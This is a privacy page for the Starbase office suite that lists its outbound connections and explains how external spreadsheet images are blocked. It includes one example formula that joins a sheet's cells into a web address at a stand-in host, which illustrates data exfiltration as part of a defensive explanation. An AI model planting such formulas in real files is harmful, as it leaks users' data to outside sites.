# Privacy: what Starbase connects to

**By default, Starbase makes no connection to anyone.** No telemetry, no crash reports, no
usage statistics, no update check, no fonts or scripts fetched from other sites. Everything
below happens only when you (or whoever runs your Starbase server) set it up or ask for it.

## Every outbound connection Starbase can make

| What | Which program | When | Goes to | What it sends |
|---|---|---|---|---|
| Connect to a server | Desktop: Docs, Sheets, Drive | Only after you choose **Connect to a server…** and type an address | The Starbase server you typed in | Your device sign-in token and the files you open or save there |
| Signing in with your own login service (OIDC) | Server | Only when its operator sets `STARBASE_OIDC_*` (see the [Docker guide](install/docker.md)) | The login service the operator named | The standard sign-in requests: discovery, token exchange, key fetch |
| Update check | Desktop: Docs, Sheets, Drive | Only when you turn it on (Docs: **Help › Check for updates**; Sheets and Drive: **File › Settings › Check for updates when Starbase starts**), or each time you click **Check for updates now** | GitHub's API: `api.github.com/repos/DomeShifter/Starbase/releases` (Starbase's own releases, never WordCraft's or GridCraft's) | An ordinary web request: no files and no personal data, only what any web request carries, such as your IP address. [GitHub's privacy statement](https://docs.github.com/site-policy/privacy-policies/github-general-privacy-statement) |
| Pictures from web addresses (`=IMAGE("https://…")`) | Web: Sheets | When a spreadsheet with an IMAGE formula is open: at once in your own spreadsheets; in any other spreadsheet only after you press **Allow** (see [External content](#external-content-in-spreadsheets)) | The address in the formula | A normal browser request for that address, including anything the formula put in it |
| Link page preview | Server (web: Sheets) | Only if the owner turned on **People › Link previews** (off by default), and only when someone rests the pointer on a web link in a sheet | That one web page (and its small picture). Addresses on your own network are never fetched; 5 seconds, 256 KB of page, at most 3 redirects | A plain request from the server, never from the browser: no files and no personal data |

The update check is **off** on a new install. Turning it on in one Starbase desktop program
turns it on for all of them on that computer (the setting is kept in `updates.json` in
Starbase's settings folder: `~/.config/starbase`, or `%APPDATA%\starbase` on Windows). When it
finds a newer release it tells you and offers the download; nothing is installed without your
say-so.

## What never connects out

- **The web apps** (Sheets, Docs and Drive in a browser) talk only to the Starbase server that
  served them, apart from IMAGE pictures (above). They never check for updates: the server, and its Docker image, are updated by
  the person who runs it.
- **The server** stores your files on the machine it runs on. It contacts other systems only
  when its operator sets that up (a login service, as above; backups go to a folder the
  operator chooses).
- **Spelling and language data** are built into the programs; nothing is downloaded. (The
  language-pack downloader in the WordCraft engine is not switched on in Starbase.)

## External content in spreadsheets

A formula can build a web address out of a sheet's data, for example
`=IMAGE("https://example.com/?"&TEXTJOIN(",",1,A1:Z99))`. Loading that picture would send the
data to that site. So, as in Excel and Google Sheets, StarSheets blocks such requests in any
spreadsheet that isn't yours until you agree:

- **Your own spreadsheets** (ones you made in Starbase, in your own folder, last changed by you)
  load web pictures as before.
- **Any other spreadsheet** (shared with you by someone else, uploaded or opened from a file, or
  a copy of one of those) loads nothing from the web. Each IMAGE cell shows a grey "blocked"
  picture, and a slim bar under the toolbar says **External content is blocked · Allow**.
- **Allow** loads the pictures and is remembered for you and that file on the server (in your
  personal settings, next to your starred files). A file not yet saved to the server is allowed
  for that tab only; the choice moves with it when it is saved.
- Only IMAGE reaches the web today. IMPORTDATA, IMPORTHTML, IMPORTXML, IMPORTFEED, IMPORTRANGE
  and WEBSERVICE aren't built yet; when they are, they go through the same guard.
- The desktop app doesn't load web pictures at all yet.

## Connections that stay on your own computer

These never leave the machine, and happen only when you use the feature:

- **Read aloud** (Docs, desktop) talks to the computer's own speech service.
- **Citations from Zotero** (Docs, desktop) talk to the Zotero app running on the same
  computer (its local port), if you have it.
- **Links** in a document or sheet open in your browser only when you click them (Sheets asks
  first, unless its link card already shows the whole address). Sheets' link card, which shows
  when you rest the pointer on a link, makes no request at all: it shows only the address
  already in the cell, with a plain globe instead of the site's own icon, and no page preview.

## Checking it yourself

The update checks live in `stardocs/app/src/updates.rs`, `starsheets/app/src/updates.rs` and
`starsheets/crates/connect` (`update_check_on`). Each program has a test that launching it
starts no update check (`no_update_check_starts_at_launch`).

If you find Starbase connecting anywhere this page doesn't list, please
[open an issue](https://github.com/DomeShifter/Starbase/issues): it is a bug.
